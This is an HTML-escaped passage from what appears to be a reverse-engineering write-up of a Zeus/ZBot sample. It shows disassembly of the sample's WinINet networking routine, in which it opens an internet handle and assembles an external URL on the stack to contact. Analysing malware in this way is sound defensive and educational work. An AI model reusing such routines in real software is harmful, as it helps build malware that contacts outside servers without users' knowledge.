&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpszProxyBypass - 0x00&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpszProxy - 0x00&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; dwAccessType - INTERNET_OPEN_TYPE_DIRECT&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD&lt;/span&gt;                         &lt;span style=&#34;color: #586E75&#34;&gt;; Meaning direct access&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;szAgent&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;ZBot&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ds&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;InternetOpenW&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;CA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_1088&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;cmp&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; If a NULL handle is returned (no internet connectivity) exit&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;jnz&lt;/span&gt;     &lt;span style=&#34;color: #268BD2&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4018E5&lt;/span&gt;  &lt;span style=&#34;color: #586E75&#34;&gt;; otherwise jump to loc_4018E5&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;DC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #93A1A1&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;__security_check_cookie@4&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; __security_check_cookie(x)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;pop&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; exit if NULL handle was retured&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We see &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096%28v=vs.85%29.aspx&#34; target=&#34;_blank&#34;&gt;InternetOpen&lt;/a&gt; called. This function initialises the WinINet functions. Agent name is &lt;code&gt;ZBot&lt;/code&gt; which is an alternate name for the &lt;code&gt;Zeus&lt;/code&gt; trojan horse. Access type is &lt;code&gt;INTERNET_OPEN_TYPE_DIRECT&lt;/code&gt; which means direct access without the use of any proxies. If a NULL handle is returned then function will exit (line 28). If not it will jump to &lt;code&gt;loc_4018E5&lt;/code&gt; (line 21).&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;loc 4018E5 - InternetOpenUrl&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_4018E5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; dwContext&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;400100h&lt;/span&gt;         &lt;span style=&#34;color: #586E75&#34;&gt;; dwFlags&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EB&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; dwHeadersLength - 0x00&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;EC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ebx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpszHeaders - 0x00&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ED&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;szUrl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F0&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; lpszUrl&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F1&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; hInternet - Handle from previous InternetOpen&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;szUrl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;740068h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:004018&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_78&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;700074h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401900&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_74&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;3A0073h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401907&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2F002Fh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040190&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_6C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;770074h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401915&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;740069h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040191&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_64&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;650074h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401923&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2E0072h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040192&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_5C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;6F0063h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401931&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2F006Dh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401938&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_54&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;690046h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040193&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;650072h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401946&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_4C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;790045h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040194&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;2F0065h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401954&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_44&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;740073h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040195&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;740061h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401962&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_3C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;730075h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401969&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;34002Fh&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401970&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_34&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;340038h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401977&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;330030h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040197&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;E&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_2C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;350033h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401985&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;350031h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040198&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;330035h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401993&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;310038h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:0040199&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;var_1C&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;360031h&lt;/span&gt;
